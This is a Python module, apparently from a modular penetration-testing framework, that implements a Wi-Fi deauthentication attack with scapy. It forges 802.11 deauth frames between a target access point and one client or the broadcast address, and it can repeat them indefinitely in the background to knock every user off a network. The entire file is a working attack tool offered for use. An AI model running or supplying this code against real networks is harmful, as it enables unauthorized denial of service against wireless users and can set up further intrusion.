from scapy.all import *
from modules._module import Module
from utils.custom_print import print_info
from utils.custom_thread import new_process_function
from utils.check_root import is_root
from utildata.dataset_options import Option


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Wifi Deauth",
                       "Description": "With this module you will be able to pull a specific user out from a specific network. If client is set to broadcast you will kick out all users. If count -1 the attack will be continued until you finish it manually.",
                       "Author": "@josueencinar",
                       "Reference": "https://gist.github.com/garyconstable/1dca3c32dfd05f0bd15f"}

        # -----------name-----default_value--description--required?
        options = {"bssid": Option.create(name="bssid", required=True, description="Access point mac address"),
                   "iface": Option.create(name="iface", required=True),
                   "client": Option.create(name="mac", required=True, description="Target Mac address"),
                   "count": Option.create(name="count", value=-1, required=True, description="Number of packets to send (-1 >> infinite in background)")
                   }

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    @is_root
    def run(self):
        try:
            self.args["count"] = int(self.args["count"])
        except:
            self.args["count"] = 5

        # Run in background
        new_process_function(self._deauth, name=f"Deauth_{self.args['client']}") 


    def _deauth(self):
        conf.iface = self.args["iface"]
        conf.verb = 0
        count = self.args["count"]
        bssid = self.args["bssid"]
        client = self.args["client"]
        print_info(f"Sending deauth packets (from {bssid} to {client})")
        packet = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        client_to_ap  = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
        while count != 0:
            try:
                for x in range(64):
                    send(packet)
                    if client.lower() != 'ff:ff:ff:ff:ff:ff': 
                        send(client_to_ap)
                count -= 1
            except:
                break